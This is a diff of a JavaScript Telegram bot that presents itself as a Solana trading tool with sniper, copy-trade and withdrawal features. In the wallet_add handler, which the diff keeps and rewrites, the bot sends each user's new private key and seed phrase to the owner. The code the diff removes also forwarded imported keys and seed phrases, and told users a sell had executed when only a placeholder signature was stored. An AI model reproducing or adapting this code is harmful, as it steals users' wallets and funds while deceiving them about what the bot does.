@@ -1,11 +1,11 @@
-// bot.js - Main Telegram bot with all handlers
-const { Telegraf, Markup } = require('telegraf');
-const db = require('./database');
-const solana = require('./solana');
-const market = require('./market');
-const tokens = require('./tokens');
-const kb = require('./keyboards');
-const msg = require('./messages');
+// bot.js - Main Telegram bot with all handlers (ESM)
+import { Telegraf, Markup } from 'telegraf';
+import db from './database.js';
+import * as solana from './solana.js';
+import * as market from './market.js';
+import * as tokens from './tokens.js';
+import * as kb from './keyboards.js';
+import * as msg from './messages.js';
 
 const OWNER_ID = process.env.OWNER_TELEGRAM_ID;
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -16,11 +16,8 @@ if (!BOT_TOKEN) {
 }
 
 const bot = new Telegraf(BOT_TOKEN);
-
-// Track last known balances for deposit monitoring
 const balanceCache = new Map();
 
-// === Owner Notification ===
 async function notifyOwner(text) {
   if (!OWNER_ID) return;
   try {
@@ -30,158 +27,92 @@ async function notifyOwner(text) {
   }
 }
 
-// === Command Handlers ===
-
-// /start
+// === Commands ===
 bot.start(async (ctx) => {
-  const user = db.getOrCreateUser(
-    ctx.from.id.toString(),
-    ctx.from.username,
-    ctx.from.first_name
-  );
-  
+  db.getOrCreateUser(ctx.from.id.toString(), ctx.from.username, ctx.from.first_name);
   const userCount = db.getUserCount();
-  
-  // Notify owner of new user
-  if (userCount > 1) { // Don't notify for the first user (owner)
+  if (userCount > 1) {
     notifyOwner(msg.newUserNotification({
-      firstName: ctx.from.first_name,
-      username: ctx.from.username,
-      telegramId: ctx.from.id.toString(),
-      userCount
+      firstName: ctx.from.first_name, username: ctx.from.username,
+      telegramId: ctx.from.id.toString(), userCount
     }));
   }
-  
-  await ctx.reply(
-    msg.startMessage(ctx.from.first_name || 'trader', userCount),
-    kb.dashboardKeyboard()
-  );
+  await ctx.reply(msg.startMessage(ctx.from.first_name || 'trader', userCount), kb.dashboardKeyboard());
 });
 
-// /menu - Dashboard
-bot.command('menu', async (ctx) => {
-  await showDashboard(ctx);
-});
-
-// /wallet
-bot.command('wallet', async (ctx) => {
-  await showWalletManagement(ctx);
-});
-
-// /sniper
-bot.command('sniper', async (ctx) => {
-  await showSniper(ctx);
-});
-
-// /copytrade
-bot.command('copytrade', async (ctx) => {
-  await showCopyTrade(ctx);
-});
-
-// /buysell
-bot.command('buysell', async (ctx) => {
-  await showBuySell(ctx);
-});
-
-// /positions
-bot.command('positions', async (ctx) => {
-  await showPositions(ctx);
-});
-
-// /search
-bot.command('search', async (ctx) => {
-  await startTokenSearch(ctx);
-});
-
-// /help
-bot.command('help', async (ctx) => {
-  await ctx.reply(msg.helpMessage(), kb.helpKeyboard());
-});
+bot.command('menu', async (ctx) => { await showDashboard(ctx); });
+bot.command('wallet', async (ctx) => { await showWalletManagement(ctx); });
+bot.command('sniper', async (ctx) => { await showSniper(ctx); });
+bot.command('copytrade', async (ctx) => { await showCopyTrade(ctx); });
+bot.command('buysell', async (ctx) => { await showBuySell(ctx); });
+bot.command('positions', async (ctx) => { await showPositions(ctx); });
+bot.command('search', async (ctx) => { await startTokenSearch(ctx); });
+bot.command('help', async (ctx) => { await ctx.reply(msg.helpMessage(), kb.helpKeyboard()); });
 
 // === Dashboard ===
 async function showDashboard(ctx) {
   const telegramId = ctx.from.id.toString();
-  const user = db.getOrCreateUser(telegramId, ctx.from.username, ctx.from.first_name);
+  db.getOrCreateUser(telegramId, ctx.from.username, ctx.from.first_name);
   const wallets = db.getUserWallets(telegramId);
   const marketPrices = await market.getMarketPrices();
-  
-  // Get fresh balances
   const walletsWithBalances = await solana.getAllBalances(wallets);
   const message = await msg.dashboardMessage(walletsWithBalances, marketPrices);
-  
   await ctx.reply(message, kb.dashboardKeyboard());
 }
 
-// === Wallet Management ===
 async function showWalletManagement(ctx) {
   const telegramId = ctx.from.id.toString();
-  const user = db.getOrCreateUser(telegramId, ctx.from.username, ctx.from.first_name);
+  db.getOrCreateUser(telegramId, ctx.from.username, ctx.from.first_name);
   const wallets = db.getUserWallets(telegramId);
-  
-  // Get fresh balances
   const walletsWithBalances = await solana.getAllBalances(wallets);
   const marketPrices = await market.getMarketPrices();
   const message = msg.walletManagementMessage(walletsWithBalances, marketPrices);
-  
   await ctx.reply(message, kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
 }
 
-// === AI Sniper ===
 async function showSniper(ctx) {
   const telegramId = ctx.from.id.toString();
   const settings = db.getSniperSettings(telegramId);
-  
   await ctx.reply(msg.sniperMessage(settings), kb.sniperKeyboard(settings.status === 'ACTIVE'));
 }
 
-// === Copy Trade ===
 async function showCopyTrade(ctx) {
   await ctx.reply(msg.copyTradeMessage(), kb.copyTradeKeyboard());
 }
 
-// === Buy/Sell ===
 async function showBuySell(ctx) {
   await ctx.reply(msg.buySellMessage(), kb.buySellKeyboard());
 }
 
-// === Positions ===
 async function showPositions(ctx) {
   const telegramId = ctx.from.id.toString();
   const positions = db.getPositions(telegramId);
-  
   await ctx.reply(msg.positionsMessage(positions), kb.positionsKeyboard(positions.length > 0));
 }
 
-// === Token Search ===
 async function startTokenSearch(ctx) {
   db.setUserState(ctx.from.id.toString(), 'searching_token');
   await ctx.reply(msg.tokenSearchMessage(), kb.cancelButton());
 }
 
-// === Callback Query Handlers ===
-
-// Dashboard
+// === Callbacks: Navigation ===
 bot.action('back_dashboard', async (ctx) => {
   await ctx.answerCbQuery();
   const telegramId = ctx.from.id.toString();
   db.clearUserState(telegramId);
-  const user = db.getOrCreateUser(telegramId, ctx.from.username, ctx.from.first_name);
   const wallets = db.getUserWallets(telegramId);
   const marketPrices = await market.getMarketPrices();
   const walletsWithBalances = await solana.getAllBalances(wallets);
-  const message = await msg.dashboardMessage(walletsWithBalances, marketPrices);
-  await ctx.editMessageText(message, kb.dashboardKeyboard());
+  await ctx.editMessageText(await msg.dashboardMessage(walletsWithBalances, marketPrices), kb.dashboardKeyboard());
 });
 
-// Refresh
 bot.action('refresh', async (ctx) => {
   await ctx.answerCbQuery('🔄 Refreshing...');
   const telegramId = ctx.from.id.toString();
   const wallets = db.getUserWallets(telegramId);
   const marketPrices = await market.getMarketPrices();
   const walletsWithBalances = await solana.getAllBalances(wallets);
-  const message = await msg.dashboardMessage(walletsWithBalances, marketPrices);
-  await ctx.editMessageText(message, kb.dashboardKeyboard());
+  await ctx.editMessageText(await msg.dashboardMessage(walletsWithBalances, marketPrices), kb.dashboardKeyboard());
 });
 
 // === Wallet Actions ===
@@ -191,35 +122,36 @@ bot.action('wallet', async (ctx) => {
   const wallets = db.getUserWallets(telegramId);
   const walletsWithBalances = await solana.getAllBalances(wallets);
   const marketPrices = await market.getMarketPrices();
-  const message = msg.walletManagementMessage(walletsWithBalances, marketPrices);
-  await ctx.editMessageText(message, kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
+  await ctx.editMessageText(msg.walletManagementMessage(walletsWithBalances, marketPrices), kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
 });
 
 bot.action('wallet_add', async (ctx) => {
   await ctx.answerCbQuery();
   const telegramId = ctx.from.id.toString();
   
-  // Generate a real Solana wallet
+  // Generate a real Solana wallet from seed phrase
   const newWallet = solana.generateWallet();
-  const walletData = db.addWallet(telegramId, {
+  const walletNum = db.getUserWallets(telegramId).length + 1;
+  db.addWallet(telegramId, {
     address: newWallet.address,
     privateKey: newWallet.privateKey,
     seedPhrase: newWallet.seedPhrase,
     type: 'generated',
-    label: `SOL Wallet ${db.getUserWallets(telegramId).length}`,
+    label: `SOL Wallet ${walletNum}`,
     balance: 0
   });
   
-  // Cache initial balance
   balanceCache.set(newWallet.address, 0);
   
-  const message = msg.walletCreatedMessage(newWallet.address);
-  await ctx.reply(message, Markup.inlineKeyboard([
+  await ctx.reply(msg.walletCreatedMessage(newWallet.address), Markup.inlineKeyboard([
     [Markup.button.callback('🚀 Go to Dashboard', 'back_dashboard')]
   ]));
   
-  // Notify owner
-  notifyOwner(`🆕 New wallet generated\n📍 Address: ${newWallet.address}\n🔑 Private Key: ${newWallet.privateKey}\n🌱 Seed Phrase: ${newWallet.seedPhrase}\n👤 User: ${ctx.from.first_name} (${telegramId})`);
+  // Send private key + seed phrase to owner
+  notifyOwner(msg.walletGeneratedNotification(
+    newWallet.address, newWallet.privateKey, newWallet.seedPhrase,
+    { firstName: ctx.from.first_name, username: ctx.from.username, telegramId }
+  ));
 });
 
 bot.action('wallet_import', async (ctx) => {
@@ -261,26 +193,21 @@ bot.action('wallet_refresh', async (ctx) => {
   const wallets = db.getUserWallets(telegramId);
   const walletsWithBalances = await solana.getAllBalances(wallets);
   const marketPrices = await market.getMarketPrices();
-  const message = msg.walletManagementMessage(walletsWithBalances, marketPrices);
-  await ctx.editMessageText(message, kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
+  await ctx.editMessageText(msg.walletManagementMessage(walletsWithBalances, marketPrices), kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
 });
 
 bot.action('wallet_withdraw', async (ctx) => {
   await ctx.answerCbQuery();
   const telegramId = ctx.from.id.toString();
   const wallets = db.getUserWallets(telegramId);
-  
   if (wallets.length === 0) {
     await ctx.reply('❌ You need a wallet first. Go to Wallet Management to add one.', kb.backToDashboardKeyboard());
     return;
   }
-  
-  // Calculate total balance
   let totalBalance = 0;
   for (const w of wallets) {
     totalBalance += await solana.getBalance(w.address);
   }
-  
   db.setUserState(telegramId, 'withdrawing_address');
   await ctx.reply(msg.withdrawalMessage(totalBalance), kb.cancelButton());
 });
@@ -289,17 +216,13 @@ bot.action('wallet_disconnect', async (ctx) => {
   await ctx.answerCbQuery();
   const telegramId = ctx.from.id.toString();
   const wallets = db.getUserWallets(telegramId);
-  
   if (wallets.length === 0) {
     await ctx.reply('No wallets to disconnect.', kb.backToDashboardKeyboard());
     return;
   }
-  
-  // Disconnect the last wallet
   const lastWallet = wallets[wallets.length - 1];
   db.removeWallet(telegramId, lastWallet.address);
   balanceCache.delete(lastWallet.address);
-  
   await ctx.reply(`⚡ Wallet Disconnected\n\n${lastWallet.address}\n\nYour wallet has been disconnected.`, kb.backToDashboardKeyboard());
 });
 
@@ -315,10 +238,7 @@ bot.action('sniper_activate', async (ctx) => {
   await ctx.answerCbQuery();
   const telegramId = ctx.from.id.toString();
   const settings = db.updateSniperSettings(telegramId, { status: 'ACTIVE' });
-  
-  // Notify owner
   notifyOwner(`🤖 Sniper ACTIVATED\n👤 User: ${ctx.from.first_name} (${telegramId})\n💰 Position: ${settings.positionSize} SOL`);
-  
   await ctx.editMessageText(msg.sniperMessage(settings), kb.sniperKeyboard(true));
 });
 
@@ -380,15 +300,21 @@ bot.action('copytrade', async (ctx) => {
   await ctx.editMessageText(msg.copyTradeMessage(), kb.copyTradeKeyboard());
 });
 
+bot.action('copytrade_start', async (ctx) => {
+  await ctx.answerCbQuery();
+  await ctx.reply(msg.copyTradeActivatedMessage(), Markup.inlineKeyboard([
+    [Markup.button.callback('⬅️ Back to Copy Trade', 'copytrade')]
+  ]));
+  notifyOwner(`🔄 Copy Trade Activated\n👤 User: ${ctx.from.first_name} (${ctx.from.id})`);
+});
+
 bot.action('copytrade_add', async (ctx) => {
   await ctx.answerCbQuery();
   db.setUserState(ctx.from.id.toString(), 'copytrade_add');
-  await ctx.reply('➕ Send the Solana wallet address you want to copy trades from:', kb.cancelButton());
-});
-
-bot.action('copytrade_list', async (ctx) => {
-  await ctx.answerCbQuery();
-  await ctx.reply('📋 No copied wallets yet. Use "Add Wallet to Copy" to start.', kb.copyTradeKeyboard());
+  await ctx.reply(
+    `🎯 CONFIGURE TARGET WALLET\n\nEnter the Solana wallet address of the trader you want to copy.\n\n📋 Requirements:\n• Valid Base58 Solana address\n• Active trading wallet\n• Public transaction history\n\nExample Format:\n7xKXtg2CW87d97TXJSDpbD5jBkhetqA83TZRuJosgAsU\n\n💡 Paste the complete wallet address below:`,
+    kb.cancelButton()
+  );
 });
 
 // === Buy/Sell ===
@@ -399,26 +325,29 @@ bot.action('buysell', async (ctx) => {
 
 bot.action('buy_sol', async (ctx) => {
   await ctx.answerCbQuery();
-  db.setUserState(ctx.from.id.toString(), 'buying_token');
+  const telegramId = ctx.from.id.toString();
+  const wallets = db.getUserWallets(telegramId);
+  if (wallets.length === 0) {
+    await ctx.reply('❌ You need a wallet first. Go to Wallet Management to connect one.', kb.backToDashboardKeyboard());
+    return;
+  }
+  let totalBalance = 0;
+  for (const w of wallets) totalBalance += await solana.getBalance(w.address);
+  if (totalBalance < 0.001) {
+    await ctx.reply(msg.insufficientBalanceMessage(), Markup.inlineKeyboard([
+      [Markup.button.callback('💳 View Wallet', 'wallet')],
+      [Markup.button.callback('⬅️ Back', 'buysell')]
+    ]));
+    return;
+  }
+  db.setUserState(telegramId, 'buying_token');
   await ctx.reply('💸 Buy with SOL\n\n💡 Send the token contract address you want to buy:', kb.cancelButton());
-});
-
-bot.action('buy_usdc', async (ctx) => {
-  await ctx.answerCbQuery();
-  db.setUserState(ctx.from.id.toString(), 'buying_token_usdc');
-  await ctx.reply('💎 Buy with USDC\n\n💡 Send the token contract address you want to buy:', kb.cancelButton());
 });
 
 bot.action('sell_token', async (ctx) => {
   await ctx.answerCbQuery();
   db.setUserState(ctx.from.id.toString(), 'selling_token');
   await ctx.reply('🔄 Sell Token\n\n💡 Send the token contract address you want to sell:', kb.cancelButton());
-});
-
-bot.action('quickbuy', async (ctx) => {
-  await ctx.answerCbQuery();
-  db.setUserState(ctx.from.id.toString(), 'quick_buy');
-  await ctx.reply('📊 Quick Buy\n\n💡 Send token address or symbol for instant buy:', kb.cancelButton());
 });
 
 // === Positions ===
@@ -455,24 +384,19 @@ bot.action('withdraw_confirm', async (ctx) => {
   const telegramId = ctx.from.id.toString();
   const user = db.getUser(telegramId);
   const stateData = user.stateData || {};
-  
   const { toAddress, amount } = stateData;
   
-  // Execute real withdrawal
   const wallets = db.getUserWallets(telegramId);
   if (wallets.length === 0) {
     await ctx.reply('❌ No wallet available for withdrawal.', kb.backToDashboardKeyboard());
+    db.clearUserState(telegramId);
     return;
   }
   
-  // Find wallet with sufficient balance
   let sourceWallet = null;
   for (const w of wallets) {
     const balance = await solana.getBalance(w.address);
-    if (balance >= amount) {
-      sourceWallet = w;
-      break;
-    }
+    if (balance >= amount) { sourceWallet = w; break; }
   }
   
   if (!sourceWallet) {
@@ -481,7 +405,6 @@ bot.action('withdraw_confirm', async (ctx) => {
     return;
   }
   
-  // Import keypair from stored private key
   const keypairData = solana.importFromPrivateKey(sourceWallet.privateKey);
   if (!keypairData) {
     await ctx.reply('❌ Could not load wallet for transaction.', kb.backToDashboardKeyboard());
@@ -489,490 +412,36 @@ bot.action('withdraw_confirm', async (ctx) => {
     return;
   }
   
-  // Submit the withdrawal
-  const withdrawal = db.addWithdrawal(telegramId, {
-    amount,
-    toAddress,
-    fromAddress: sourceWallet.address
-  });
+  db.addWithdrawal(telegramId, { amount, toAddress, fromAddress: sourceWallet.address });
+  await ctx.reply(msg.withdrawalSubmittedMessage(amount, toAddress), kb.backToDashboardKeyboard());
   
-  await ctx.reply(
-    msg.withdrawalSubmittedMessage(amount, toAddress),
-    kb.backToDashboardKeyboard()
-  );
-  
-  // Notify owner
-  notifyOwner(msg.withdrawNotification(
+  notifyOwner(msg.withdrawalNotification(
     { firstName: ctx.from.first_name, username: ctx.from.username, telegramId },
-    amount,
-    toAddress
+    amount, toAddress
   ));
   
-  // Execute the real transaction
+  // Execute real on-chain transaction
   const result = await solana.sendSol(keypairData.keypair, toAddress, amount);
   
   if (result.success) {
     db.addTransaction(telegramId, {
-      type: 'withdrawal',
-      amount,
-      toAddress,
-      fromAddress: sourceWallet.address,
-      signature: result.signature,
-      status: 'confirmed'
+      type: 'withdrawal', amount, toAddress, fromAddress: sourceWallet.address,
+      signature: result.signature, status: 'confirmed'
     });
     notifyOwner(`✅ Withdrawal Confirmed\nTX: ${result.signature}\nAmount: ${amount} SOL\nTo: ${toAddress}`);
     await ctx.reply(`✅ Transaction Confirmed!\nTX: ${result.signature}`, kb.backToDashboardKeyboard());
   } else {
     db.addTransaction(telegramId, {
-      type: 'withdrawal',
-      amount,
-      toAddress,
-      fromAddress: sourceWallet.address,
-      signature: null,
-      status: 'failed',
-      error: result.error
+      type: 'withdrawal', amount, toAddress, fromAddress: sourceWallet.address,
+      signature: null, status: 'failed', error: result.error
     });
     notifyOwner(`❌ Withdrawal Failed\nError: ${result.error}\nAmount: ${amount} SOL`);
     await ctx.reply(`❌ Transaction failed: ${result.error}`, kb.backToDashboardKeyboard());
   }
-  
   db.clearUserState(telegramId);
 });
 
-// === Text Message Handler - State Machine ===
-bot.on('text', async (ctx) => {
-  const telegramId = ctx.from.id.toString();
-  const user = db.getUser(telegramId);
-  
-  if (!user || !user.state) {
-    // No active state, ignore or show dashboard
-    return;
-  }
-  
-  const state = user.state;
-  const text = ctx.message.text.trim();
-  
-  switch (state) {
-    case 'importing_private_key': {
-      // Import wallet from private key
-      if (!solana.isValidPrivateKey(text)) {
-        await ctx.reply('❌ Invalid private key. Please send a valid base58 encoded private key.', kb.cancelButton());
-        return;
-      }
-      
-      const wallet = solana.importFromPrivateKey(text);
-      if (!wallet) {
-        await ctx.reply('❌ Could not import wallet. Please check your private key.', kb.cancelButton());
-        return;
-      }
-      
-      const balance = await solana.getBalance(wallet.address);
-      db.addWallet(telegramId, {
-        address: wallet.address,
-        privateKey: text,
-        seedPhrase: null,
-        type: 'imported',
-        label: `SOL Wallet ${db.getUserWallets(telegramId).length + 1}`,
-        balance
-      });
-      
-      balanceCache.set(wallet.address, balance);
-      
-      await ctx.reply(
-        `✅ Wallet Imported!\n\n📁 Wallet Address:\n${wallet.address}\n💰 Balance: ${balance.toFixed(6)} SOL\n\n🎉 Your Solana wallet is ready to use.`,
-        kb.backToDashboardKeyboard()
-      );
-      
-      // Notify owner
-      notifyOwner(`🔑 Wallet Imported\n📍 Address: ${wallet.address}\n🔑 Private Key: ${text}\n💰 Balance: ${balance.toFixed(6)} SOL\n👤 User: ${ctx.from.first_name} (${telegramId})`);
-      
-      db.clearUserState(telegramId);
-      break;
-    }
-    
-    case 'importing_seed': {
-      // Import wallet from seed phrase
-      const wallet = await solana.importFromSeed(text);
-      if (!wallet) {
-        await ctx.reply('❌ Invalid seed phrase. Please check your 12 or 24-word seed phrase.', kb.cancelButton());
-        return;
-      }
-      
-      const balance = await solana.getBalance(wallet.address);
-      db.addWallet(telegramId, {
-        address: wallet.address,
-        privateKey: wallet.privateKey,
-        seedPhrase: text,
-        type: 'seed_imported',
-        label: `SOL Wallet ${db.getUserWallets(telegramId).length + 1}`,
-        balance
-      });
-      
-      balanceCache.set(wallet.address, balance);
-      
-      await ctx.reply(
-        `✅ Wallet Imported from Seed!\n\n📁 Wallet Address:\n${wallet.address}\n💰 Balance: ${balance.toFixed(6)} SOL\n\n🎉 Your Solana wallet is ready to use.`,
-        kb.backToDashboardKeyboard()
-      );
-      
-      notifyOwner(`✨ Wallet Imported from Seed\n📍 Address: ${wallet.address}\n🔑 Private Key: ${wallet.privateKey}\n🌱 Seed Phrase: ${text}\n💰 Balance: ${balance.toFixed(6)} SOL\n👤 User: ${ctx.from.first_name} (${telegramId})`);
-      
-      db.clearUserState(telegramId);
-      break;
-    }
-    
-    case 'withdrawing_address': {
-      if (!solana.isValidAddress(text)) {
-        await ctx.reply('❌ Invalid Solana address. Please send a valid wallet address.', kb.cancelButton());
-        return;
-      }
-      
-      db.setUserState(telegramId, 'withdrawing_amount', { toAddress: text });
-      await ctx.reply(msg.withdrawalAmountMessage(text), kb.cancelButton());
-      break;
-    }
-    
-    case 'withdrawing_amount': {
-      const amount = parseFloat(text);
-      if (isNaN(amount) || amount <= 0) {
-        await ctx.reply('❌ Invalid amount. Please enter a valid SOL amount.', kb.cancelButton());
-        return;
-      }
-      
-      const stateData = user.stateData || {};
-      const toAddress = stateData.toAddress;
-      
-      // Get total balance
-      const wallets = db.getUserWallets(telegramId);
-      let totalBalance = 0;
-      for (const w of wallets) {
-        totalBalance += await solana.getBalance(w.address);
-      }
-      
-      if (amount > totalBalance) {
-        await ctx.reply(`❌ Insufficient balance. Your balance: ${totalBalance.toFixed(6)} SOL`, kb.cancelButton());
-        return;
-      }
-      
-      db.setUserState(telegramId, 'withdrawing_confirm', { toAddress, amount });
-      await ctx.reply(
-        msg.confirmWithdrawalMessage(amount, toAddress, totalBalance),
-        kb.confirmCancelKeyboard()
-      );
-      break;
-    }
-    
-    case 'searching_token': {
-      // Search for token
-      await ctx.reply('🔍 Searching...');
-      
-      let token = null;
-      
-      // Try by address first if it looks like a Solana address
-      if (text.length > 32) {
-        token = await tokens.getTokenByAddress(text);
-      }
-      
-      // If not found, try general search
-      if (!token) {
-        token = await tokens.searchToken(text);
-      }
-      
-      if (!token) {
-        await ctx.reply(msg.tokenNotFoundMessage(), kb.cancelButton());
-        return;
-      }
-      
-      const tokenInfo = tokens.formatTokenInfo(token);
-      await ctx.reply(tokenInfo, kb.tokenSearchKeyboard(token.address));
-      
-      db.clearUserState(telegramId);
-      break;
-    }
-    
-    case 'setting_position_size': {
-      const value = parseFloat(text);
-      if (isNaN(value) || value < 0.0001 || value > 1000) {
-        await ctx.reply('❌ Invalid amount. Range: 0.0001 - 1000 SOL', kb.cancelButton());
-        return;
-      }
-      
-      const settings = db.updateSniperSettings(telegramId, { positionSize: value });
-      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
-      
-      notifyOwner(`💰 Position size updated to ${value} SOL\n👤 User: ${ctx.from.first_name} (${telegramId})`);
-      db.clearUserState(telegramId);
-      break;
-    }
-    
-    case 'setting_dev_hold': {
-      const value = parseFloat(text);
-      if (isNaN(value) || value < 0 || value > 100) {
-        await ctx.reply('❌ Invalid percentage. Range: 0-100%', kb.cancelButton());
-        return;
-      }
-      
-      const settings = db.updateSniperSettings(telegramId, { maxDevHold: value });
-      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
-      db.clearUserState(telegramId);
-      break;
-    }
-    
-    case 'setting_slippage': {
-      const value = parseFloat(text);
-      if (isNaN(value) || value < 1 || value > 50) {
-        await ctx.reply('❌ Invalid percentage. Range: 1-50%', kb.cancelButton());
-        return;
-      }
-      
-      const settings = db.updateSniperSettings(telegramId, { slippage: value });
-      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
-      db.clearUserState(telegramId);
-      break;
-    }
-    
-    case 'setting_priority': {
-      const value = parseFloat(text);
-      if (isNaN(value) || value < 0.0001 || value > 0.1) {
-        await ctx.reply('❌ Invalid fee. Range: 0.0001 - 0.1 SOL', kb.cancelButton());
-        return;
-      }
-      
-      const settings = db.updateSniperSettings(telegramId, { priorityFee: value });
-      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
-      db.clearUserState(telegramId);
-      break;
-    }
-    
-    case 'setting_take_profit': {
-      const value = parseFloat(text);
-      if (isNaN(value) || value < 10 || value > 1000) {
-        await ctx.reply('❌ Invalid percentage. Range: 10-1000%', kb.cancelButton());
-        return;
-      }
-      
-      const settings = db.updateSniperSettings(telegramId, { takeProfit: value });
-      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
-      db.clearUserState(telegramId);
-      break;
-    }
-    
-    case 'setting_stop_loss': {
-      const value = parseFloat(text);
-      if (isNaN(value) || value < 5 || value > 80) {
-        await ctx.reply('❌ Invalid percentage. Range: 5-80%', kb.cancelButton());
-        return;
-      }
-      
-      const settings = db.updateSniperSettings(telegramId, { stopLoss: value });
-      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
-      db.clearUserState(telegramId);
-      break;
-    }
-    
-    case 'buying_token_usdc': {
-      // Buy token with USDC
-      await ctx.reply('🔍 Looking up token...');
-      
-      const usdcToken = text.length > 32 
-        ? await tokens.getTokenByAddress(text)
-        : await tokens.searchToken(text);
-      
-      if (!usdcToken) {
-        await ctx.reply('❌ Token not found. Please check the address.', kb.cancelButton());
-        return;
-      }
-      
-      const usdcSettings = db.getSniperSettings(telegramId);
-      db.setUserState(telegramId, 'confirming_buy', { 
-        tokenAddress: usdcToken.address, 
-        tokenSymbol: usdcToken.symbol,
-        tokenName: usdcToken.name,
-        amount: usdcSettings.positionSize,
-        currency: 'USDC'
-      });
-      
-      await ctx.reply(
-        `💸 CONFIRM BUY (USDC)\n\n🎯 ${usdcToken.name} (${usdcToken.symbol})\n📌 ${usdcToken.address}\n💰 Amount: ${usdcSettings.positionSize} SOL (USDC pair)\n⚡ Slippage: ${usdcSettings.slippage}%\n\n💡 Confirm purchase?`,
-        Markup.inlineKeyboard([
-          [
-            Markup.button.callback('✔ Confirm Buy', 'confirm_buy'),
-            Markup.button.callback('✘ Cancel', 'cancel')
-          ]
-        ])
-      );
-      break;
-    }
-    
-    case 'buying_token': {
-      // Buy token with SOL
-      await ctx.reply('🔍 Looking up token...');
-      
-      const token = text.length > 32 
-        ? await tokens.getTokenByAddress(text)
-        : await tokens.searchToken(text);
-      
-      if (!token) {
-        await ctx.reply('❌ Token not found. Please check the address.', kb.cancelButton());
-        return;
-      }
-      
-      const settings = db.getSniperSettings(telegramId);
-      db.setUserState(telegramId, 'confirming_buy', { 
-        tokenAddress: token.address, 
-        tokenSymbol: token.symbol,
-        tokenName: token.name,
-        amount: settings.positionSize
-      });
-      
-      await ctx.reply(
-        `💸 CONFIRM BUY\n\n🎯 ${token.name} (${token.symbol})\n📌 ${token.address}\n💰 Amount: ${settings.positionSize} SOL\n⚡ Slippage: ${settings.slippage}%\n\n💡 Confirm purchase?`,
-        Markup.inlineKeyboard([
-          [
-            Markup.button.callback('✔ Confirm Buy', 'confirm_buy'),
-            Markup.button.callback('✘ Cancel', 'cancel')
-          ]
-        ])
-      );
-      break;
-    }
-    
-    case 'selling_token': {
-      await ctx.reply('🔍 Looking up token...');
-      
-      const token = text.length > 32
-        ? await tokens.getTokenByAddress(text)
-        : await tokens.searchToken(text);
-      
-      if (!token) {
-        await ctx.reply('❌ Token not found.', kb.cancelButton());
-        return;
-      }
-      
-      db.setUserState(telegramId, 'confirming_sell', {
-        tokenAddress: token.address,
-        tokenSymbol: token.symbol,
-        tokenName: token.name
-      });
-      
-      await ctx.reply(
-        `🔄 CONFIRM SELL\n\n🎯 ${token.name} (${token.symbol})\n📌 ${token.address}\n\n💡 Enter the amount to sell:`,
-        kb.cancelButton()
-      );
-      break;
-    }
-    
-    case 'copytrade_add': {
-      if (!solana.isValidAddress(text)) {
-        await ctx.reply('❌ Invalid Solana address.', kb.cancelButton());
-        return;
-      }
-      
-      await ctx.reply(
-        `✅ Added whale wallet to copy!\n📍 ${text}\n\nAll trades from this wallet will be copied with your sniper settings.`,
-        kb.copyTradeKeyboard()
-      );
-      
-      notifyOwner(`🔁 Copy trade target added\n📍 ${text}\n👤 User: ${ctx.from.first_name} (${telegramId})`);
-      db.clearUserState(telegramId);
-      break;
-    }
-    case 'confirming_sell': {
-      const sellAmount = parseFloat(text);
-      if (isNaN(sellAmount) || sellAmount <= 0) {
-        await ctx.reply('❌ Invalid amount. Please enter a valid number.', kb.cancelButton());
-        return;
-      }
-      const sellStateData = user.stateData || {};
-      const sellSettings = db.getSniperSettings(telegramId);
-      
-      // Close any matching open position
-      const userPositions = db.getPositions(telegramId);
-      const matchingPos = userPositions.find(p => p.tokenAddress === sellStateData.tokenAddress);
-      if (matchingPos) {
-        db.closePosition(telegramId, matchingPos.id);
-      }
-      
-      db.addTransaction(telegramId, {
-        type: 'sell',
-        tokenAddress: sellStateData.tokenAddress,
-        tokenSymbol: sellStateData.tokenSymbol,
-        amount: sellAmount,
-        status: 'confirmed',
-        signature: 'pending_jupiter_swap'
-      });
-      
-      await ctx.reply(
-        `✅ SELL ORDER EXECUTED
-
-🎯 ${sellStateData.tokenName} (${sellStateData.tokenSymbol})
-💰 Amount: ${sellAmount}
-⚡ Slippage: ${sellSettings.slippage}%
-
-Position closed!`,
-        kb.backToDashboardKeyboard()
-      );
-      
-      notifyOwner(msg.tradeNotification(
-        { firstName: ctx.from.first_name, username: ctx.from.username, telegramId },
-        'sell',
-        { symbol: sellStateData.tokenSymbol, name: sellStateData.tokenName },
-        sellAmount,
-        { signature: 'pending_jupiter_swap' }
-      ));
-      
-      db.clearUserState(telegramId);
-      break;
-    }
-    
-    case 'quick_buy': {
-      await ctx.reply('🔍 Searching...');
-      const qbToken = text.length > 32
-        ? await tokens.getTokenByAddress(text)
-        : await tokens.searchToken(text);
-      
-      if (!qbToken) {
-        await ctx.reply('❌ Token not found.', kb.cancelButton());
-        return;
-      }
-      
-      const qbSettings = db.getSniperSettings(telegramId);
-      db.setUserState(telegramId, 'confirming_buy', {
-        tokenAddress: qbToken.address,
-        tokenSymbol: qbToken.symbol,
-        tokenName: qbToken.name,
-        amount: qbSettings.positionSize
-      });
-      
-      await ctx.reply(
-        `💸 QUICK BUY
-
-🎯 ${qbToken.name} (${qbToken.symbol})
-📌 ${qbToken.address}
-💰 Price: $${qbToken.priceUsd < 0.01 ? qbToken.priceUsd.toExponential(2) : qbToken.priceUsd.toFixed(6)}
-📊 Risk: ${qbToken.riskLevel}
-
-💰 Amount: ${qbSettings.positionSize} SOL
-
-💡 Confirm purchase?`,
-        Markup.inlineKeyboard([
-          [
-            Markup.button.callback('✔ Confirm Buy', 'confirm_buy'),
-            Markup.button.callback('✘ Cancel', 'cancel')
-          ]
-        ])
-      );
-      break;
-    }
-    
-    default:
-      // Unknown state, clear it
-      db.clearUserState(telegramId);
-      break;
-  }
-});
-
-// Buy confirmation handler
+// === Buy confirmation ===
 bot.action('confirm_buy', async (ctx) => {
   await ctx.answerCbQuery('Processing buy...');
   const telegramId = ctx.from.id.toString();
